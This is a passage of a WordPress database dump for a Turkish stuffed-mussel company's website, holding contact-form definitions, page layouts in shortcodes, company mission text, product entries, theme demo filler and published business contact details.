  KEY `post_name` (`post_name`(191))
) ENGINE=MyISAM AUTO_INCREMENT=1134 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `cmrfu_posts` VALUES("4","1","2014-02-19 19:27:44","2014-02-19 17:27:44","<p>Adınız (gerekli)<br />
    [text* your-name] </p>

<p>Epostanız (gerekli)<br />
    [email* your-email] </p>

<p>Konu<br />
    [text your-subject] </p>

<p>İletiniz<br />
    [textarea your-message] </p>
<p>[captchac captcha-897 size:m] [captchar captcha-897]</p>

<p>[submit \"Gönder\"]</p>
İsmido İletişim Formu
info@ismido.com.tr
isim: [your-name]

email: [your-email]

konu: [your-subject]

ileti: [your-message]
info@ismido.com.tr


1










İletiniz başarılı olarak gönderildi. Teşekkürler.
İletinizi gönderme başarısız oldu. Lütfen daha sonra tekrar deneyin ya da yönetici ile başka bir yöntemle iletişime geçin.
Onaylama hataları meydana geldi. Lütfen alanları doğrulayın ve tekrar gönderin.
İletinizi gönderme başarısız oldu. Lütfen daha sonra tekrar deneyin ya da yönetici ile başka bir yöntemle iletişime geçin.
İlerlemek için lütfen koşulları kabul edin.
Lütfen gerekli alanları doldurun.
Girdiğiniz kod doğru değil.
Sayı biçimi geçersiz görünüyor.
Bu sayı çok küçük.
Bu sayı çok büyük.
Eposta adresi geçersiz görünüyor.
URL geçersiz görünüyor.
Telefon numarası geçersiz görünüyor.
Yanıtınız doğru değil.
Tarih biçimi geçersiz görünüyor.
Bu tarih çok erken.
Bu tarih çok geç.
Dosya gönderme başarısız.
Bu dosya türüne izin verilmiyor.
Bu dosya çok büyük.
Dosya gönderme başarısız. Hata meydana geldi.
The field is too long.
The field is too short.","İletişim formu 1","","publish","open","open","","iletisim-formu-1","","","2016-11-23 01:13:16","2016-11-22 23:13:16","","0","http://www.ismido.com.tr/?post_type=wpcf7_contact_form&#038;p=4","0","wpcf7_contact_form","","0");
INSERT INTO `cmrfu_posts` VALUES("929","1","2014-08-29 22:26:13","2014-08-29 19:26:13","[cols]
[col-8]

[contact-form-7 id=\"4\" title=\"İletişim formu 1\"]
[/col-8]
[col-4]

[heading title=\"İstanbul Ofis\"][/heading]
[list]
[list_item icon=\"home\"]Nüshetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul[/list_item]
[list_item icon=\"envelope\"]info@herkonyapi.com[/list_item]
[list_item icon=\"phone-sign\"]+90 212 261 61 50 - 52[/list_item]

[list_item icon=\"phone-sign\"]+90 532 255 15 90[/list_item]

[/list]

[/col-4]
[/cols]","İletişim","","inherit","open","open","","447-revision-v1","","","2014-08-29 22:26:13","2014-08-29 19:26:13","","447","http://www.ismido.com.tr/447-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("11","1","2014-02-19 19:38:51","2014-02-19 17:38:51","","Features","","publish","open","open","","features-2","","","2014-02-19 19:38:51","2014-02-19 17:38:51","","0","http://www.ismido.com.tr/features-2/","5","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("12","1","2014-02-19 19:38:51","2014-02-19 17:38:51","","Shortcodes","","publish","open","open","","shortcodes-2","","","2014-02-19 19:38:51","2014-02-19 17:38:51","","0","http://www.ismido.com.tr/shortcodes-2/","9","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("13","1","2014-02-19 19:38:51","2014-02-19 17:38:51","","Page","","publish","open","open","","page-2","","","2014-02-19 19:38:51","2014-02-19 17:38:51","","0","http://www.ismido.com.tr/page-2/","31","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("14","1","2014-02-19 19:38:51","2014-02-19 17:38:51","","Portfolio","","publish","open","open","","portfolio-2","","","2014-02-19 19:38:51","2014-02-19 17:38:51","","0","http://www.ismido.com.tr/portfolio-2/","38","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("447","1","2013-10-12 02:06:02","2013-10-12 02:06:02","[cols]
[col-8]

[contact-form-7 id=\"4\" title=\"İletişim formu 1\"]
[/col-8]
[col-4]

[heading title=\"İstanbul Ofis\"][/heading]
[list]
[list_item icon=\"home\"]Kocatepe Mahallesi Kuru Gıda Hali   Mega Center C blok  No: 383   Bayrampaşa Istanbul[/list_item]
[list_item icon=\"envelope\"]info@ismido.com.tr[/list_item]
[list_item icon=\"phone-sign\"]+90 212 640 95 62[/list_item]

[list_item icon=\"phone-sign\"]+90 534 738 88 88[/list_item]

[/list]

[/col-4]
[/cols]","İletişim","","publish","closed","closed","","iletisim","","","2016-11-23 00:47:57","2016-11-22 22:47:57","","0","http://localhost/leaf/wordpress/?page_id=447","0","page","","0");
INSERT INTO `cmrfu_posts` VALUES("912","1","2014-06-02 13:49:34","2014-06-02 10:49:34","[cols]
[col-8]
<h4></h4>
[contact-form-7 id=\"446\" title=\"Contact form 1\"]
[/col-8]
[col-4]

[heading title=\"İstanbul Ofis\"][/heading]
[list]
[list_item icon=\"home\"]Refik Osman Top Sok. Maçka İstanbul[/list_item]
[list_item icon=\"envelope\"]info@herkonyapi.com[/list_item]
[list_item icon=\"phone-sign\"]+90 212 222 10 10[/list_item]
[/list]

[/col-4]
[/cols]","İletişim","","inherit","open","open","","447-revision-v1","","","2014-06-02 13:49:34","2014-06-02 10:49:34","","447","http://www.ismido.com.tr/447-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("819","1","2014-02-20 09:20:46","2014-02-20 07:20:46","[cols]
[col-8]
<h4>Get in touch</h4>
Lorem ipsum dolor sit amet, consectetur adipisicing elit. Debitis, sint totam facere deleniti ad a quidem omnis molestiae consectetur ratione. Commodi porro totam animi alias corporis nemo asperiores consectetur quos.
[contact-form-7 id=\"446\" title=\"Contact form 1\"]
[/col-8]
[col-4]

[heading title=\"İstanbul Ofis\"][/heading]
[list]
[list_item icon=\"home\"]100 Mainstreet Blvd[/list_item]
[list_item icon=\"envelope\"]hello@everislabs.com[/list_item]
[list_item icon=\"phone-sign\"]1900-1580-EVERIS[/list_item]
[/list]

[notification class=\"top-20\" type=\"notice\" close=\"true/false\"]

Debitis, sint totam facere deleniti ad a quidem omnis molestiae consectetur ratione.

[/notification]

[/col-4]
[/cols]","İletişim","","inherit","open","open","","447-revision-v1","","","2014-02-20 09:20:46","2014-02-20 07:20:46","","447","http://www.ismido.com.tr/447-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("454","1","2013-10-12 07:32:12","2013-10-12 07:32:12","","Duyurular","","publish","closed","closed","","blog","","","2014-06-02 14:15:14","2014-06-02 11:15:14","","0","http://localhost/leaf/wordpress/?page_id=454","0","page","","0");
INSERT INTO `cmrfu_posts` VALUES("497","1","2013-10-12 11:34:55","2013-10-12 11:34:55","[cols]
[col-9]

Herkon Yapı, 1993’ e kadar proje bazında yürüttüğünü çalışmaları 1993 yılında

Hakan Yapı adı altında kurumsallaşmış, 2007 yılında da isim değişikliğine giderek

Herkon bünyesinde toplanmış dürüstlük ve istikrar politikalarını gözeterek yapmış

olduğu başarılı çalışmalarla inşaat sektöründe kökleşmiş örnek bir firmadır.

Beşiktaş, Ortaköy, Şişli, Ulus, Teşvikiye, Maçka bölgelerinde bugüne kadar ürettiği

sayısız projede % 100 başarıya ulaşmanın haklı gururu ve özgüveniyle bundan sonra

gerçekleştireceği tüm projeleri de başarıyla tamamlayacak olmanın güvencesini

vermektedir.
<h4>Vizyonumuz ;</h4>
Estetik ve fonksiyonel açıdan en iyi çözümlerle farklı tasarımlar oluşturarak, kaliteden

ödün vermeden müşteri beklentilerinin üstüne çıkmak, müşterilerimizin koşulsuz

memnuniyetini sağlamak ve sektörümüze öncülük etmektir...
<h4>Misyonumuz ;</h4>
Yüksek standartlı,kaliteli hizmet,kaliteli malzeme kullanarak müşteri memnuniyetini

en üst düzeye çıkarmak, Müşterilerimizin zamanına ve haklarına saygı duymak,

sektör ile alakalı yönetmeliklere %100 uyumlu projeler yaparak

İnsanlığa , çevreye ve evrensel değerlere olan sorumluluklarımızı yerine getirmektir...

[/col-9]

[/cols]

&nbsp;","Kurumsal","","publish","closed","closed","","kurumsal","","","2014-08-29 22:29:35","2014-08-29 19:29:35","","0","http://localhost/leaf/wordpress/?page_id=497","0","page","","0");
INSERT INTO `cmrfu_posts` VALUES("911","1","2014-06-02 13:45:39","2014-06-02 10:45:39","[cols]
[col-9]

Herkon Yapı, 1993’ e kadar proje bazında yürüttüğünü çalışmaları 1993 yılında

Hakan Yapı adı altında kurumsallaşmış, 2007 yılında da isim değişikliğine giderek

Herkon bünyesinde toplanmış dürüstlük ve istikrar politikalarını gözeterek yapmış

olduğu başarılı çalışmalarla inşaat sektöründe kökleşmiş örnek bir firmadır.

Beşiktaş, Ortaköy, Şişli, Ulus, Teşvikiye, Maçka bölgelerinde bugüne kadar ürettiği

sayısız projede % 100 başarıya ulaşmanın haklı gururu ve özgüveniyle bundan sonra

gerçekleştireceği tüm projeleri de başarıyla tamamlayacak olmanın güvencesini

vermektedir.
<h4>Vizyonumuz ;</h4>
Estetik ve fonksiyonel açıdan en iyi çözümlerle farklı tasarımlar oluşturarak, kaliteden

ödün vermeden müşteri beklentilerinin üstüne çıkmak, müşterilerimizin koşulsuz

memnuniyetini sağlamak ve sektörümüze öncülük etmektir...
<h4>Misyonumuz ;</h4>
Yüksek standartlı,kaliteli hizmet,kaliteli malzeme kullanarak müşteri memnuniyetini

en üst düzeye çıkarmak, Müşterilerimizin zamanına ve haklarına saygı duymak,

sektör ile alakalı yönetmeliklere %100 uyumlu projeler yaparak

İnsanlığa , çevreye ve evrensel değerlere olan sorumluluklarımızı yerine getirmektir...

[/col-9]

[/cols]

&nbsp;","Hakkımızda","","inherit","open","open","","497-revision-v1","","","2014-06-02 13:45:39","2014-06-02 10:45:39","","497","http://www.ismido.com.tr/497-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("909","1","2014-06-02 13:43:13","2014-06-02 10:43:13","[cols]
[col-9]
<h4>Who We Are ?</h4>
Lorem ipsum dolor sit amet, consectetur adipisicing elit. Vero, harum, expedita, delectus perferendis modi soluta nam ab unde libero sit obcaecati nemo optio eligendi quam eveniet ea rem voluptates facilis?

Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ad, mollitia, maiores dolorem nesciunt modi molestias accusamus repellat voluptatem quibusdam optio sapiente nemo nisi eum quo quidem quis aperiam error voluptate.

Nunc et rutrum consetetur sadipscing dolor elitr, sed diam nonumy lore at volutpat. Sed consectetur suscipit lorem nunc.adipiscing elit. Integercommodo tristique odio, quis fringilla ligula aliquet. Proin iaculis purus consequat dursus dolor dignitea onecade lore porttitora suscipit aenean roncus posuere odio tincidunt posuere molestie. Nam aliquam volutpat vel bibendum nunc elit purus tempus pulvinar rhoncus eges tas vel nibheas volutpat leo aliquam in scelerise sagittis.

Ad, mollitia, maiores dolorem nesciunt modi molestias accusamus repellat voluptatem quibusdam optio sapiente nemo nisi eum.
[/col-9]
[col-3]
[callout style=\"1\" title=\"We Hiring\" button_title=\"Apply\" button_color=\"color\" link=\"#\" target=\"_self\"]
Lorem ipsum dolor sit amet, consectetur adipisicing elit. Sapiente, vitae distinctio unde quod dolor atque fugiat aut dolore sequi itaque.
[/callout]
[/col-3]
[/cols]
[cols]
[col-6]
<h4 class=\"top-20\">How We Do</h4>
[accordion]
[accordion_item title=\"Our Company Mission\"]Proin iaculis purus consequat dursus dolor dignitea onecade lore porttitora suscipit aenean roncus posuere odio tincidunt posuere molestie. Nam aliquam volutpat vel bibendum nunc elit purus tempus pulvinar rhoncus eges tas vel nibheas volutpat leo aliquam in scelerise sagittis.[/accordion_item]
[accordion_item title=\"Success Stories\"]Proin iaculis purus consequat dursus dolor dignitea onecade lore porttitora suscipit aenean roncus posuere odio tincidunt posuere molestie. Nam aliquam volutpat vel bibendum nunc elit purus tempus pulvinar rhoncus eges tas vel nibheas volutpat leo aliquam in scelerise sagittis.[/accordion_item]
[accordion_item title=\"Our Approach\"]Proin iaculis purus consequat dursus dolor dignitea onecade lore porttitora suscipit aenean roncus posuere odio tincidunt posuere molestie. Nam aliquam volutpat vel bibendum nunc elit purus tempus pulvinar rhoncus eges tas vel nibheas volutpat leo aliquam in scelerise sagittis.[/accordion_item]
[accordion_item title=\"Our Solutions\"]Proin iaculis purus consequat dursus dolor dignitea onecade lore porttitora suscipit aenean roncus posuere odio tincidunt posuere molestie. Nam aliquam volutpat vel bibendum nunc elit purus tempus pulvinar rhoncus eges tas vel nibheas volutpat leo aliquam in scelerise sagittis.[/accordion_item]
[accordion_item title=\"Company Culture\"]Proin iaculis purus consequat dursus dolor dignitea onecade lore porttitora suscipit aenean roncus posuere odio tincidunt posuere molestie. Nam aliquam volutpat vel bibendum nunc elit purus tempus pulvinar rhoncus eges tas vel nibheas volutpat leo aliquam in scelerise sagittis.[/accordion_item]
[/accordion]
[/col-6]
[col-6]

&nbsp;","Hakkımızda","","inherit","open","open","","497-revision-v1","","","2014-06-02 13:43:13","2014-06-02 10:43:13","","497","http://www.ismido.com.tr/497-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("524","1","2013-10-12 13:57:23","2013-10-12 13:57:23","[cols]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Ürünlerimiz\"][/portfolio]
[cols]
[col-6]
[heading title=\"Bayilik Almak İstiyorum\"][/heading]
[contact-form-7 id=\"995\" title=\"Bayilik Almak İstiyorum\"]
[/col-6]
[col-6]
[heading title=\"İletişim Adresi\"][/heading]
[mapbox image=\"https://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Kocatepe Mahallesi Kuru Gıda Hali   Mega Center C blok   No: 383   Bayrampaşa Istanbul\"][map lat=\"41.043189\" lon=\" 29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Bayrampaşa Istanbul\" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Kocatepe Mahallesi Kuru Gıda Hali   Mega Center C /blok   No: 383   Bayrampaşa Istanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Anasayfa","","publish","closed","closed","","home","","","2016-11-22 23:54:47","2016-11-22 21:54:47","","0","http://localhost/leaf/wordpress/?page_id=524","0","page","","0");
INSERT INTO `cmrfu_posts` VALUES("917","1","2014-06-02 14:02:40","2014-06-02 11:02:40","[cols]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Projelerimiz\"][/portfolio]
[cols]
[col-6]
[heading title=\"Blog\"][/heading]
[section][posts cat=\"\" number=\"1\" column=\"6\" content=1][/posts][postlist class=\"top-10\" title=\"Other Blog Posts\" cat=\"\" number=\"1\" offset=\"1\"][/postlist][/section]
[/col-6]
[col-6]
[heading title=\"İletişim Adresi\"][/heading]
[mapbox image=\"http://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Refik Osman Top Sok. Maçka, Beşiktaş Istanbul\"][map lat=\"41.043189\" lon=\" 29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Refik Osman Top Sokak Istanbul\" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Refik Osman Top Sok. Maçka, Beşiktaş Istanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Anasayfa","","inherit","open","open","","524-revision-v1","","","2014-06-02 14:02:40","2014-06-02 11:02:40","","524","http://www.ismido.com.tr/524-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("836","1","2014-06-02 12:39:00","2014-06-02 09:39:00","[cols]
[col-4]
[block icon=\"heart\" title=\"Responsive Design\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"star\" title=\"Easy Customize\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"tint\" title=\"Powerful Options\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Portfolio Carouse\"][/portfolio]
[cols]
[col-6]
[heading title=\"From The Blog\"][/heading]
[section][posts cat=\"\" number=\"1\" column=\"6\" content=1][/posts][postlist class=\"top-10\" title=\"Other Blog Posts\" cat=\"\" number=\"1\" offset=\"1\"][/postlist][/section]
[/col-6]
[col-6]
[heading title=\"Our Office\"][/heading]
[mapbox image=\"http://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Refik Osman Top Sok.&lt;br /&gt;Maçka,&lt;br /&gt;Beşiktaş Istanbul\"][map lat=\"0\" lon=\"0\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Istanbul\" kml=\"\" maker=\"yes\" makerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Refik Osman Top Sok.&lt;br /&gt;Maçka,&lt;br /&gt;Beşiktaş Istanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Home","","inherit","open","open","","524-revision-v1","","","2014-06-02 12:39:00","2014-06-02 09:39:00","","524","http://www.ismido.com.tr/524-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("835","1","2014-06-02 12:37:27","2014-06-02 09:37:27","[cols]
[col-4]
[block icon=\"heart\" title=\"Responsive Design\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"star\" title=\"Easy Customize\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[col-4]
[block icon=\"tint\" title=\"Powerful Options\" button_title=\"More Info\" button_color=\"\" link=\"#\" target=\"_self\"]Quisque volutpat condimentum velit. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos.[/block]
[/col-4]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Portfolio Carouse\"][/portfolio]
[cols]
[col-6]
[heading title=\"From The Blog\"][/heading]
[section][posts cat=\"\" number=\"1\" column=\"6\" content=1][/posts][postlist class=\"top-10\" title=\"Other Blog Posts\" cat=\"\" number=\"1\" offset=\"1\"][/postlist][/section]
[/col-6]
[col-6]
[heading title=\"Our Office\"][/heading]
[mapbox image=\"http://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"Our Office\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Corbi in ipsum sit amet pede facilisis laoreet. Donec lacus nunc, viverra nec, blandit vel, egestas et, augue.\"][map lat=\"0\" lon=\"0\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Istanbul\" kml=\"\" maker=\"yes\" makerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Refik Osman Top Sok.&lt;br /&gt;Maçka,&lt;br /&gt;Beşiktaş Istanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Home","","inherit","open","open","","524-revision-v1","","","2014-06-02 12:37:27","2014-06-02 09:37:27","","524","http://www.ismido.com.tr/524-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("910","1","2014-06-02 13:45:17","2014-06-02 10:45:17","[cols]
[col-9]

Herkon Yapı, 1993’ e kadar proje bazında yürüttüğünü çalışmaları 1993 yılında

Hakan Yapı adı altında kurumsallaşmış, 2007 yılında da isim değişikliğine giderek

Herkon bünyesinde toplanmış dürüstlük ve istikrar politikalarını gözeterek yapmış

olduğu başarılı çalışmalarla inşaat sektöründe kökleşmiş örnek bir firmadır.

Beşiktaş, Ortaköy, Şişli, Ulus, Teşvikiye, Maçka bölgelerinde bugüne kadar ürettiği

sayısız projede % 100 başarıya ulaşmanın haklı gururu ve özgüveniyle bundan sonra

gerçekleştireceği tüm projeleri de başarıyla tamamlayacak olmanın güvencesini

vermektedir.
<h4>Vizyonumuz ;</h4>
Estetik ve fonksiyonel açıdan en iyi çözümlerle farklı tasarımlar oluşturarak, kaliteden

ödün vermeden müşteri beklentilerinin üstüne çıkmak, müşterilerimizin koşulsuz

memnuniyetini sağlamak ve sektörümüze öncülük etmektir...

Misyonumuz ;

Yüksek standartlı,kaliteli hizmet,kaliteli malzeme kullanarak müşteri memnuniyetini

en üst düzeye çıkarmak, Müşterilerimizin zamanına ve haklarına saygı duymak,

sektör ile alakalı yönetmeliklere %100 uyumlu projeler yaparak

İnsanlığa , çevreye ve evrensel değerlere olan sorumluluklarımızı yerine getirmektir...

[/col-9]

[/cols]

&nbsp;","Hakkımızda","","inherit","open","open","","497-autosave-v1","","","2014-06-02 13:45:17","2014-06-02 10:45:17","","497","http://www.ismido.com.tr/497-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("177","1","2013-10-11 03:08:18","2013-10-11 03:08:18","","Maxi Midye Dolma","","publish","closed","closed","","maxi-midye-dolma","","","2016-11-22 23:31:59","2016-11-22 21:31:59","","0","http://localhost/leaf/wordpress/?post_type=portfolio&#038;p=177","0","portfolio","","0");
INSERT INTO `cmrfu_posts` VALUES("182","1","2013-10-11 04:58:18","2013-10-11 04:58:18","","Jumbo Midye Dolma","","publish","closed","closed","","jumbo-midye-dolma","","","2016-11-22 23:30:56","2016-11-22 21:30:56","","0","http://localhost/leaf/wordpress/?post_type=portfolio&#038;p=182","0","portfolio","","0");
INSERT INTO `cmrfu_posts` VALUES("854","1","2014-06-02 13:15:10","2014-06-02 10:15:10","","Hervenik Dubleks 6","","inherit","open","open","","177-autosave-v1","","","2014-06-02 13:15:10","2014-06-02 10:15:10","","177","http://www.ismido.com.tr/177-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("184","1","2013-10-11 05:02:59","2013-10-11 05:02:59","","İç Midye","","publish","closed","closed","","ic-midye","","","2016-11-22 23:29:06","2016-11-22 21:29:06","","0","http://localhost/leaf/wordpress/?post_type=portfolio&#038;p=184","0","portfolio","","0");
INSERT INTO `cmrfu_posts` VALUES("848","1","2014-06-02 13:12:33","2014-06-02 10:12:33","","Hervenik Apartman Daire 4","","inherit","open","open","","182-autosave-v1","","","2014-06-02 13:12:33","2014-06-02 10:12:33","","182","http://www.ismido.com.tr/182-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("186","1","2013-10-11 05:06:11","2013-10-11 05:06:11","","Kara Midye","","publish","closed","closed","","kara-midye","","","2016-11-22 23:17:23","2016-11-22 21:17:23","","0","http://localhost/leaf/wordpress/?post_type=portfolio&#038;p=186","0","portfolio","","0");
INSERT INTO `cmrfu_posts` VALUES("834","1","2016-11-22 23:53:56","2016-11-22 21:53:56","[cols]
[/cols]
[portfolio number=\"8\" carousel=\"1\" column=\"3\" title=\"Ürünlerimiz\"][/portfolio]
[cols]
[col-6]
[heading title=\"Bayilik Almak İstiyorum\"][/heading]
[contact-form-7 id=\"995\" title=\"Bayilik Almak İstiyorum\"]
[/col-6]
[col-6]
[heading title=\"İletişim Adresi\"][/heading]
[mapbox image=\"https://everislabs.com/themes/er-leaf/wp-content/uploads/2013/10/co-workspace.png\" title=\"İletişim\" button_title=\"Bizi ziyaret edin\" button_color=\"color\" target=\"_self\" button_icon=\"plane\" desc=\"Kocatepe Mahallesi Kuru Gıda Hali   Mega Center C /blok   No: 383   Bayrampaşa /istanbul\"][map lat=\"41.043189\" lon=\" 29.000523\" id=\"map\" z=\"14\" w=\"100%\" h=\"100%\" maptype=\"ROADMAP\" address=\"Nüzhetiye Caddesi Beşiktaş  Istanbul\" kml=\"\" marker=\"yes\" markerimage=\"\" traffic=\"no\" bike=\"no\" infowindown=\"Nüzhetiye Cad. Köksalan Apt. No:2 D:1 Beşiktaş İstanbul\" infowindowndefault=\"yes\" directions=\"\" hidecontrols=\"false\" scale=\"false\" scrollwheel=\"true\" style=\"\"][/map][/mapbox]
[/col-6]
[/cols]","Anasayfa","","inherit","open","open","","524-autosave-v1","","","2016-11-22 23:53:56","2016-11-22 21:53:56","","524","http://www.ismido.com.tr/524-autosave-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("446","1","2013-10-12 01:51:27","2013-10-12 01:51:27","<p>İsim*<br />
    [text* your-name] </p>

<p>Email*<br />
    [email* your-email] </p>

<p>Konu<br />
    [text your-subject] </p>

<p>Mesajınız<br />
    [textarea your-message] </p>

<p>[submit class:button class:color \"Gönder\"]</p>
[your-subject]
info@herkonyapi.com
From: [your-name] <[your-email]>
Subject: [your-subject]

Message Body:
[your-message]

--
This e-mail was sent from a contact form on Leaf (http://localhost/leaf/wordpress)
info@herkonyapi.com




[your-subject]
[your-name] <[your-email]>
Message Body:
[your-message]

--
This e-mail was sent from a contact form on Leaf (http://localhost/leaf/wordpress)
[your-email]



Your message was sent successfully. Thanks.
Failed to send your message. Please try later or contact the administrator by another method.
Validation errors occurred. Please confirm the fields and submit it again.
Failed to send your message. Please try later or contact the administrator by another method.
Please accept the terms to proceed.
Please fill the required field.
Your entered code is incorrect.
Date format seems invalid.
This date is too early.
This date is too late.
Failed to upload file.
This file type is not allowed.
This file is too large.
Failed to upload file. Error occurred.
Number format seems invalid.
This number is too small.
This number is too large.
Your answer is not correct.
Email address seems invalid.
URL seems invalid.
Telephone number seems invalid.","Contact form 1","","publish","open","open","","contact-form-1","","","2014-02-20 09:25:55","2014-02-20 07:25:55","","0","http://localhost/leaf/wordpress/?post_type=wpcf7_contact_form&#038;p=446","0","wpcf7_contact_form","","0");
INSERT INTO `cmrfu_posts` VALUES("449","1","2013-10-12 02:33:54","2013-10-12 02:33:54","<div class=\"cols\">
<div class=\"col-4\">
<p>Your Name (required)<br />
    [text* your-name] </p>

<p>Your Email (required)<br />
    [email* your-email] </p>

<p>Subject<br />
    [text your-subject] </p>
</div>
<div class=\"col-4\">
<p>Your Message<br />
    [textarea your-message] </p>

<p>[submit class:button class:color \"Send\"]</p>
</div>
</div>
[your-subject]
[your-name] <[your-email]>
From: [your-name] <[your-email]>
Subject: [your-subject]

Message Body:
[your-message]

--
This e-mail was sent from a contact form on Leaf (http://localhost/leaf/wordpress)
hoathuancntt@gmail.com




[your-subject]
[your-name] <[your-email]>
Message Body:
[your-message]

--
This e-mail was sent from a contact form on Leaf (http://localhost/leaf/wordpress)
[your-email]



Your message was sent successfully. Thanks.
Failed to send your message. Please try later or contact the administrator by another method.
Validation errors occurred. Please confirm the fields and submit it again.
Failed to send your message. Please try later or contact the administrator by another method.
Please accept the terms to proceed.
Please fill the required field.
Your entered code is incorrect.
Date format seems invalid.
This date is too early.
This date is too late.
Failed to upload file.
This file type is not allowed.
This file is too large.
Failed to upload file. Error occurred.
Number format seems invalid.
This number is too small.
This number is too large.
Your answer is not correct.
Email address seems invalid.
URL seems invalid.
Telephone number seems invalid.","Quick Contact","","publish","open","open","","quick-contact","","","2013-10-12 02:33:54","2013-10-12 02:33:54","","0","http://localhost/leaf/wordpress/?post_type=wpcf7_contact_form&amp;p=449","0","wpcf7_contact_form","","0");
INSERT INTO `cmrfu_posts` VALUES("710","1","2014-02-19 19:38:52","2014-02-19 17:38:52"," ","","","publish","open","closed","","710","","","2017-01-25 21:24:06","2017-01-25 19:24:06","","0","http://www.ismido.com.tr/710/","1","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("715","1","2014-02-19 19:38:53","2014-02-19 17:38:53"," ","","","publish","open","closed","","715","","","2017-01-25 21:24:07","2017-01-25 19:24:07","","0","http://www.ismido.com.tr/715/","8","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("1062","1","2016-11-22 23:52:16","2016-11-22 21:52:16","ismido.com.tr yeni tasarımıyla sizlerle...","İsmido","","inherit","closed","closed","","924-revision-v1","","","2016-11-22 23:52:16","2016-11-22 21:52:16","","924","http://www.ismido.com.tr/924-revision-v1/","0","revision","","0");
INSERT INTO `cmrfu_posts` VALUES("717","1","2014-02-19 19:38:53","2014-02-19 17:38:53"," ","","","publish","open","closed","","717","","","2016-11-22 23:51:24","2016-11-22 21:51:24","","0","http://www.ismido.com.tr/717/","3","nav_menu_item","","0");
INSERT INTO `cmrfu_posts` VALUES("916","1","2014-06-02 14:01:09","2014-06-02 11:01:09","[cols]
[col-4]
